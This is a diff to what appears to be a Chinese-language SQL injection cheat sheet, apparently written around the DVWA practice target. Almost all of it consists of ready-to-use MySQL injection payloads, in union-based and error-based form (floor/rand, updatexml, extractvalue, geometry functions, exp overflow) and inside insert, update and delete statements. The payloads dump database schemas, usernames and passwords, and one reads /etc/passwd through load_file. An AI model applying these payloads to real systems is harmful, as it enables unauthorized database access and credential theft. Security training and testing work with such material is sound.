@@ -176,11 +176,53 @@ select * from users order by password ;
 1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() //获取数据库中的表
 select group_concat(user) from users where user_id=1 or user_id=2;
 1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' //获取表字段名
-1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users 
+1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users
 {
 id=-1 union select 1,2,3,database(),5,6,7,8
 (select table_name from information_schema.tables where table_schema='dvwa' limit 1,1),5,6,7,8
 (select column_name from information_schema.columns where table_schema='dvwa'  and table_name='users' limit 4,1)
 (select password from dvwa.users limit 0,1),(select user from dvwa.users limit 0,1)
 }
+```
+
+报错注入：
+```sql
+floor函数
+1' and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a) --+
+select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2))
+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)  //爆数据库
+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) //爆表
+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=表名 LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)  //爆字段
+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x23,user_id,0x3a,password,0x23) FROM user limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)  //爆内容
+
+UPDATEXML函数
+1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+
+(0x7e,(select table_name from information_schema.tables where table_schema='dvwa' limit 1,1),0x7e)
+' and (extractvalue(1,concat(0x7e,(select user()),0x7e))) --+
+
+几何函数报错
+1' and geometrycollection((select * from(select * from(select user())a)b));
+1' and multipoint((select * from(select * from(select user())a)b));
+1' and polygon((select * from(select * from(select user())a)b));
+1' and multipolygon((select * from(select * from(select user())a)b));
+1' and linestring((select * from(select * from(select user())a)b));
+1' and multilinestring((select * from(select * from(select user())a)b));
+
+exp
+1' and exp(~(select * from(select user())a));
+select ~0 //将0取反，函数成功执行后返回0的缘故，我们将成功执行的函数取反就会得到最大的无符号BIGINT值。
+MySql5.5.5版本后整形溢出才会报错
+得到表名：
+select exp(~(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x));
+得到列名：
+select exp(~(select*from(select column_name from information_schema.columns where table_name='users' limit 0,1)x));
+检索数据：
+select exp(~ (select*from(select concat_ws(':',id, username, password) from users limit 0,1)x));
+insert into users (id, username, password) values (2, '' or !(select*from(select user())x)-~0 or '', 'Eyre');
+select exp(~(select*from(select load_file('/etc/passwd'))a));读取本地文件
+insert into users (id, username, password) values (2, '' or !(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x)-~0 or '', 'Eyre');
+
+update users set password='Peter' or !(select*from(select user())x)-~0 or '' where id=4;
+
+delete from users where id='1' or !(select*from(select user())x)-~0 or '';
 ```
